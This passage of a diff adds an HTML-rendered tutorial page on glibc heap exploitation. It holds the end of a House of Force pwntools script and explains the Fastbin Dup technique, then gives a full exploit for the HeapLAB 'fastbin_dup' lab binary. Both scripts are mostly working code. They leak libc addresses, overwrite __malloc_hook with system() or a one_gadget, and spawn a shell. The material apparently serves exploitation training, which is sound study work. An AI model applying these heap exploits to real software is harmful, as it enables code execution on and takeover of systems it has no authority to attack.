+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'binsh: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# House of Force: Overwrite top_chunk size
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffffffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    # Overwrite target with &quot;OVERWRIT&quot;
+    target = elf.symbols['target']
+    top_chunk = heap_addr + 0x20
+    offset = top_chunk - target + 32
+    ru('&amp;gt;')
+    malloc(-offset, p64(0xdeadbeef))
+    malloc(16, 'OVERWRIT')
+    sla('&amp;gt;', '2')
+    &quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Pop shell with ret2libc by overwriting __malloc_hook with system() 
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;top_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;top_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]})&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;fastbin-dupe-tricking-malloc-into-returning-an-already-allocated-heap-pointer-by-abusing-the-fastbin-freelist-to-gain-an-arbitrary-write-primitive&quot;&gt;Fastbin Dupe: Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist to gain an arbitrary write primitive&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Allocate chunks in fastbin size, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20 - 0x80&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ability to free chunks in any order&lt;/li&gt;
+  &lt;li&gt;Ability to forge or find fake chunk&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Arbitrary Write Primitive&lt;/strong&gt;&lt;br /&gt;
+&lt;em&gt;Assuming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; is the address to be overwritten&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Allocate 2 chunks, free them in alternating order: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free(1), free(0), free(1)&lt;/code&gt;. This causes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer of the second chunk to link back to the first in the fastbin list.&lt;/li&gt;
+  &lt;li&gt;Forge a fake chunk somehow at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 16&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 8&lt;/code&gt; must hold chunk size equal to size of previous chunks.&lt;/li&gt;
+  &lt;li&gt;Allocate chunk, with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 16&lt;/code&gt; as the data to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer in the fastbin list.&lt;/li&gt;
+  &lt;li&gt;Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.&lt;/li&gt;
+  &lt;li&gt;Allocate chunk with data to be written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Gaining RCE using ret2libc&lt;/strong&gt;&lt;br /&gt;
+&lt;em&gt;This requires libc version to be known&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; using write primitive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;one_gadget&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Fake chunk can be found using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_fake_fast &amp;amp;__malloc_hook&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwndbg&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Chunk size of all previous chunks must be same as chunk size in this fake chunk&lt;/li&gt;
+      &lt;li&gt;As chunk is not allocated with alignment, data when overwriting becomes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;padding + one_gadget&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; HeapLAB &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fastbin_dup&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./fastbin_dup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'index: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# Get puts leak
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# Setting random username
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'JEFFJOHN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# Calculate libc addresses
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe1fa1&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__malloc_hook'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    
+    &lt;span class=&quot;c1&quot;&gt;# Fastbin dup
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Overwrite __malloc_hook with one_gadget 
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Pop shell
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
